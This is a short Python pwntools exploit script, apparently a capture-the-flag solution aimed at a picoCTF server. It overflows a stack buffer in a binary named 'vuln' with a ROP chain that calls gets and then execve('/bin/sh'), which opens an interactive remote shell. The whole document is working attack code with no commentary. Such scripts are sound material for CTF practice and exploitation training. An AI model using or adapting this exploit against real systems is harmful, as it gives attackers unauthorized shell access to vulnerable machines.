from pwn import *
context.kernel = 'amd64'
elf = ELF('./vuln')

p = remote('saturn.picoctf.net', 57122)

rop = ROP(elf)
rop.call('gets', [0x080e62c0])
rop.execve(0x080e62c0, 0, 0)
print(rop.dump())

payload = b"a" * 0x1c + rop.chain()

p.sendline(payload)
p.sendline(b"/bin/sh")

p.interactive()
